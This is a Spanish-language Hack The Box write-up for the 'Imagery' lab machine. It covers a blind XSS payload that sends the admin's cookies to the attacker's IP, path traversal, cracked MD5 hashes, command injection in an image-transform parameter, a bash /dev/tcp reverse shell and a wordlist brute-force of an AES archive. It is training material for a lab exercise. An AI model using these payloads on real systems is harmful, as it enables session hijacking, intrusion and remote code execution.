---
layout: post
title: Imagery - Hack The Box
date: 2025-10-24
categories: [Hack The Box, Linux,]
tags:  [Linux, Web, Web, Fuzz, Python, XSS, Blind XSS, LFI, Code Analysis, Command Injection, Zip.AES, Decrypt, SUDOERS, charcol]
image:
  path: htb-writeup-imagery/imagery.png
  alt: imagery
---

![logo](htb-writeup-imagery/imagery-logo.png){: .right w="200" h="200" }

Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de subida de archivos (imagenes) pero luego nos encontramos con un apartado donde se podian subir reportes de bugs, en esta seccion cargamos un payload en `XSS` que lo derivamos a un `Blind XSS to Admin Account`, dentro del panel del usuario Admin nos encontramos con un boton que nos permitia descargar un archivo que contenia `logs`, aprovechamos a interceptar y ver el endpoint con `Burp` y asi descubriendo un `LFI`. Enumerando archivos internos de la maquina observamos un `db.json` que en su contenido se ubicaban los hashes md5 del usuario `testuser` y `admin`, logramos crackear el hash de testuser y nos logueamos como dicho usuario, dentro de este panel nos encontramos con mas funciones que nos permitieron ejecutar comandos en el sistema mediante un `Command Injection` en uno de los parametros de la funcion `Transform Image`. Una vez conseguida la shell enumerando obtuvimos un archivo con extension `zip.aes` que logramos descifrar con `PyAesCrypt`, en su contenido ubicamos otro `db.json` con hashes de los usuarios `mark` y `web`, tambien logramos crackear el hash de mark y pasando del usuario web a mark. Una vez conseguida la shell como `mark` este podia ejecutar como SUDO una herramienta llamada `charcol`, investigamos como ejecutar comandos con esta herramienta y logramos escalar al usuario ROOT.

## Reconocimiento

### Nmap

Empezamos la maquina con un escaneo basico con nmap pasandole el `-p-` para escanear todo el rango de puertos, `--open` este parametro nos va mostrar solo los puertos abiertos, `-n` `-Pn` sin resolucion DNS y descubrimiento de HOSTS, `-vvv` para que nos muestre por consola los puertos que se encuentran abiertos mientras realiza el escaneo

```bash
nmap -p- --open -T4 -vvv -n -Pn 10.10.11.88
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 14:24 CEST
Initiating SYN Stealth Scan at 14:24
Scanning 10.10.11.88 [65535 ports]
Discovered open port 22/tcp on 10.10.11.88
SYN Stealth Scan Timing: About 39.33% done; ETC: 14:26 (0:00:48 remaining)
Discovered open port 8000/tcp on 10.10.11.88
Completed SYN Stealth Scan at 14:27, 126.07s elapsed (65535 total ports)
Nmap scan report for 10.10.11.88
Host is up, received user-set (0.18s latency).
Scanned at 2025-10-24 14:24:58 CEST for 126s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 126.15 seconds
           Raw packets sent: 105226 (4.630MB) | Rcvd: 102796 (4.112MB)
```

- Puerto 22
  + SSH

- Puerto 8000
  + HTTP

### Nmap Servicios de Puertos

Una vez detectado los puertos abiertos, iniciamos con la deteccion de los servicios que corren en el puerto `22` y `8000`

```bash
nmap -p22,8000 -sCV 10.10.11.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 15:20 CEST
Nmap scan report for 10.10.11.88
Host is up (0.27s latency).

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```

No hay muchos puertos abiertos, solo existe una web que corre por el puerto 8000

## Web

![](htb-writeup-imagery/imagery1.png)

A simple vista parece una aplicacion web sobre imagenes, ya nos podemos imaginar lo que significa (Arbitrary File Upload) alguna vulnerabilidad sobre subida de archivos.... tambien logramos ver un boton de `login` y `register`

![](htb-writeup-imagery/imagery2.png)

Primero nos vamos a registrar con el usuario `mrincreible@imagery.htb` y la contraseña `mrincreible`

![](htb-writeup-imagery/imagery3.png)

Antes de iniciar sesion quiero mostrarles de que manera pueden ver un poco mas sobre la web con curl

```bash
curl http://10.10.11.88:8000 -I
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 24 Oct 2025 20:26:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 146960
Connection: close
```

Ya que con wappalayzer a veces no muestra nada, podemos hacerlo con curl pasandole el parametro `-I`

![](htb-writeup-imagery/imagery4.png)


### Enumeracion Web Fuzz

Pasamos a esta seccion de fuzzear la web para encontrar mas funcionalidades de la app y aprovecharlas

![](htb-writeup-imagery/imagery5.png)

```bash
/images
/login
/register
/logout
```

Solo encontramos esto, pero en la web tenemos un boton `/upload`. Es raro, quizas la funcionalidad de este boton este del lado de cliente o en el template como un `JS`

Tenemos un Token

![](htb-writeup-imagery/imagery6.png)

![](htb-writeup-imagery/imagery7.png)

No es valido como un `JWT`

### Upload Files

![](htb-writeup-imagery/imagery8.png)

En esta parte vamos a realizar un testeo a la subida de archivos, subiremos imagenes sin cargas de `XXE,XSS,SSRF o SQLi` ya que en este tipo de vulnerabilidades se pueden subir archivos con estas cargas

![](htb-writeup-imagery/imagery9.png)

![](htb-writeup-imagery/imagery10.png)

Apreciamos la subida de una imagen con extension `.png`, quiero resaltar lo que pusimos en el campo `title` y `description` a la hora de subir la imagen

Vemos un campo que se refleja en el output de la subida, se ve el campo title y description `test`.

![](htb-writeup-imagery/imagery11.png)

Podemos descargar la imagen y tambien borrarla.

```bash
http://10.10.11.88:8000/uploads/77e0649c-520b-4b1c-bacb-40388e85c34e_bmw.jpg
```

![](htb-writeup-imagery/imagery12.png)

En la anterior imagen observamos un apartado de `group` `Add New Group` `Save Group` pero no podemos modificar este como el usuario `mrincreible`

Primero estamos entendiendo de que manera funciona la aplicacion web para buscar vias de explotacion. Una de ellas se observa a la hora de reflejar el campo `title` y `description`, vamos a intentar inyectar una carga XSS en estos campos.

```bash
test"><script>alert(0)</script>
```

![](htb-writeup-imagery/imagery13.png)

![](htb-writeup-imagery/imagery14.png)

Al parecer el codigo harcodea y sanitiza bien las entradas en esos campos.

Observando bien a fondo la web nos encontramos con una seccion llamada `Report Bug`

![](htb-writeup-imagery/imagery15.png)

![](htb-writeup-imagery/imagery16.png)

En estos campos de `Bug Name` y `Bug Details` voy a poner una carga XSS, siempre pongo en todos los campos para estar seguro del ataque ya que no sabemos cual de los campos es el vulnerable.

```bash
<img src="http://10.10.16.8/poc.jpg">
```

mientras nos ponemos en escucha con netcat por el puerto 80, ya que la imagen la va a cargar de mi HOST como poc.jpg

```bash
nc -nlvp 80
```

![](htb-writeup-imagery/imagery17.png)

Funciona!!!. Esto ya seria un Blind XSS (XSS a Ciegas), quiero creer que el reporte lo abre algun administrador, vamos a preparar una carga `XSS` para secuestrar la sesion del admin.

### Blind XSS to Admin Account

```bash
<img src=x onerror=fetch('http://10.10.16.8/?c='+document.cookie);>
```

![](htb-writeup-imagery/imagery18.png)

Como observamos en la imagen tuvimos errores en nc y optamos por ponernos en escucha por el puerto 80 con `python` teniendo exito.

```bash
.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPwk2Q.rf7KI0Y79__1S5ABZshZnMkv3H8
```

Tenemos el token de Admin, lo que queda es remplazarlo por la nuestra y secuestrarlo

![](htb-writeup-imagery/imagery19.png)

![](htb-writeup-imagery/imagery20.png)

### LFI (Local File Inclusion)

Este es el Panel de administracion, todos los reportes pasan por aca.

A simple vista logramos visualizar que podemos descargar un `log` del usuario admin y otro del usuario `testuser@imagery.htb`, para ovservar mejor la descarga de ese archivo lo interceptamos con `Burpsuite`

![](htb-writeup-imagery/imagery21.png)

Es un archivo que muestra los logs de inicio de sesion del Administrador, supongo que es lo mismo para el usuario `testuser`.

Lo primero que se me ocurre testear a la hora de ver archivos que se pueden descargar es:

```bash
../../../../../etc/passwd o ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

```

Los archivos que se descargan de un servidor los toma de alguna carpeta y esto hace que se desencadene un `Path Traversal` o `LFI`, se puede `URLencodear para Bypassear alguna Restriccion`

![](htb-writeup-imagery/imagery22.png)

Tenemos un LFI valido, logramos ver el `/etc/passwd`

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

![](htb-writeup-imagery/imagery23.png)

El archivo `/proc/self/environ` nos va a mostrar las variables de entorno que estan colocadas a nivel de sistema, pero no vemos nada relevante.

Es importante ir jugando con el `Path Traversal` ir probando de `../` a `../../` o `../../../`

Una aplicacion que esta escrita en el lenguaje de `Python` va a tener un app.py, config.py, api.py, settings.py, routes.py.... etc, esto solo es una supocicion no digo que todas las apps lo tengan.

![](htb-writeup-imagery/imagery24.png)

```python
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

![](htb-writeup-imagery/imagery25.png)

config.py

```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

En config.py al principio del script vemos que esta cargando un `db.json`, quizas se trate de alguna base de datos

db.json

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

En db.json encontramos hashes que al parecer son md5, un algoritmo de cifrado extremadamente débil. Vamos a intentar crackearlo con crackstation via web

![](htb-writeup-imagery/imagery26.png)

Solo pudimos crackear el hash del usuario `testuser`, este lo vimos en el panel de admin. Quiero hacerme la idea que el puede tener alguna funcionalidad extra para la subida y edicion de imagenes.

Vamos a iniciar sesion como `testuser`

![](htb-writeup-imagery/imagery27.png)

Aparece un boton nuevo `Manage Groups`.

Si subimos una imagen como lo hicimos anteriormente, se nos desbloquean mas funcionalidades como el procesamiento de imagenes

![](htb-writeup-imagery/imagery28.png)

### Inyeccion de Comandos (Command Injection)

- Edit Details
  + Solo modifica la descripcion y nombre de la imagen

- Convert Format
  + Puede convertir el formato de imagen a jpg, bmp, gif, pdf, etc.

- Transform Image
  + Vale la pena probarlo, ya que puede recortar , ajustar el color y rotar la imagen. Como por ejemplo se puede modificar el tamaño de la imagen.

![](htb-writeup-imagery/imagery29.png)

![](htb-writeup-imagery/imagery30.png)

Si nos detenemos un poco en esta parte para recordar todo lo que obtuvimos hasta ahora, reuniendo la informacion observamos que en `config.py` hay una parte del script que nombra `ImageMagick`, este es una herramienta de edicion de imagenes del lado de backend.

Lo siguiente seria interceptar la peticion cuando realizamos una accion en `Transform Image`.

![](htb-writeup-imagery/imagery31.png)

Aqui se puede probar muchas cosas, creanme que probe de todo. Pero en uno de los parametros como `x` se puede ejecutar comandos de la siguiente manera:

![](htb-writeup-imagery/imagery32.png)

![](htb-writeup-imagery/imagery33.png)

```bash
"x":"0; bash -c 'ping -c 1 10.10.16.8' #"
```

Recibiendo con exito el ping y comando que ejecutamos en la maquina. Solo queda ganar acceso al sistema con alguna reverse shell.

En la web se crea un apartado con la imagen que editamos (Transformed)

![](htb-writeup-imagery/imagery34.png)


```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'
```

![](htb-writeup-imagery/imagery35.png)

Estamos dentro!!!!!! Conseguimos una shell!!!!

## Escalada de Privilegios

### Shell como Web

Enumerando primero las tareas cron o tareas programadas que se ejecutan a nivel de sistema en intervalos regulares de tiempo, nos encontramos con esto:

```bash
web@Imagery:~/web$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * python3 /home/web/web/bot/admin.py
```

Existe una tarea `0 5 * * 1 tar -zcf /var/backups/home.tgz /home/` que esta deshabilitada pero quizas haya generado copias de seguridad en su tiempo.

En la carpeta `/var/backups` nos encontramos con mucha informacion que almacena linux de manera regular. Pero cuando nos dirijiamos a dicha carpeta, en el camino nos encontramos con

```bash
web@Imagery:/var$ ls -l
total 48
drwxr-xr-x  2 root root   4096 Sep 22 18:56 backup
drwxr-xr-x  3 root root   4096 Sep 23 16:27 backups
drwxr-xr-x 17 root root   4096 Sep 22 18:56 cache
drwxrwsrwt  2 root root   4096 Sep 22 18:56 crash
drwxr-xr-x 45 root root   4096 Sep 22 19:11 lib
drwxrwsr-x  2 root staff  4096 Sep 22 18:56 local
lrwxrwxrwx  1 root root      9 Oct  7  2024 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Oct 27 12:56 log
drwxrwsr-x  2 root mail   4096 Sep 22 18:56 mail
drwxr-xr-x  2 root root   4096 Sep 22 18:56 opt
lrwxrwxrwx  1 root root      4 Oct  7  2024 run -> /run
drwxr-xr-x  8 root root   4096 Sep 22 18:56 snap
drwxr-xr-x  4 root root   4096 Sep 22 18:56 spool
drwxrwxrwt  9 root root   4096 Oct 27 13:09 tmp
web@Imagery:/var$ id
uid=1001(web) gid=1001(web) groups=1001(web)
web@Imagery:/var$ cd backup
web@Imagery:/var/backup$ ls -l
total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Un archivo zip.aes, a simple viste tiene pinta de que vamos a luchar con descifrarlo.

Como primera medida vamos a traerlo a nuestra maquina para tratar de abrirlo

- ZIP.AES
  + web_20250806_120723.zip.aes

Para desencriptar este archivo vamos a tener que instalar [pyAesCrypt](https://github.com/marcobellaccini/pyAesCrypt)

Este oneliner va a probar diferentes combinaciones que toma del diccionario `rockyou.txt`.

```bash
while IFS= read -r p; do pyAesCrypt -d web_20250806_120723.zip.aes -o /tmp/out.zip -p "$p" >/dev/null 2>&1 && echo "[+] Password: $p" && mv /tmp/out.zip web_20250806_120723.zip.aes && break; done < /usr/share/wordlists/rockyou.txt
[+] Password: bestfriends
```

Esta es la contraseña para abrir el archivo, este zip no se abre de una manera normal como haciendo un `unzip`. Se descomprime pasandole alguno de los scripts que tiene el [pyAesCrypt](https://github.com/marcobellaccini/pyAesCrypt)

```bash
❯ pwd
/home/mrincreible/HTB/imagery/decrypt/web_zip/web
❯ ls -l
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  __pycache__
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:22 2025  env
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  system_logs
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  templates
.rw-rw-r-- root root 9.6 KB Tue Aug  5 08:56:42 2025  api_admin.py
.rw-rw-r-- root root 6.2 KB Tue Aug  5 08:56:54 2025  api_auth.py
.rw-rw-r-- root root  12 KB Tue Aug  5 08:57:06 2025  api_edit.py
.rw-rw-r-- root root 8.9 KB Tue Aug  5 08:57:20 2025  api_manage.py
.rw-rw-r-- root root 840 B  Tue Aug  5 08:58:18 2025  api_misc.py
.rw-rw-r-- root root  12 KB Tue Aug  5 08:58:38 2025  api_upload.py
.rw-rw-r-- root root 1.9 KB Tue Aug  5 15:21:24 2025  app.py
.rw-rw-r-- root root 1.8 KB Tue Aug  5 08:59:48 2025  config.py
.rw-rw-r-- root root 1.5 KB Wed Aug  6 12:07:02 2025  db.json
.rw-rw-r-- root root 3.9 KB Tue Aug  5 09:00:20 2025  utils.py
```

Este archivo contiene un backup del proyecto que corre por el puerto 8000, es decir la aplicacion web que logramos vulnerar con un `Command Injection`

En db.json existen otros usuarios que no conocemos, pero si estan a nivel de sistema linux.

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

![](htb-writeup-imagery/imagery36.png)

### Shell como mark

Esta contraseña es de mark, nos sirve para pivotear a este usuario y seguir enumerando para conseguir el `root`

```bash
mark@Imagery:~$ ls -l
total 4
-rw-r----- 1 root mark 33 Oct 27 12:17 user.txt
mark@Imagery:~$ cat user.txt 
db6acff4c693ac960b8bd818e411ea1e
```

### SUDO

```bash
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Podemos ejecutar como root esta herramienta, vamos a ver como funciona.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol -h
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
```

Podemos conseguir una shell pero en la herramienta

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-27 15:44:54] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> help
charcol> help
[2025-10-27 15:44:59] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
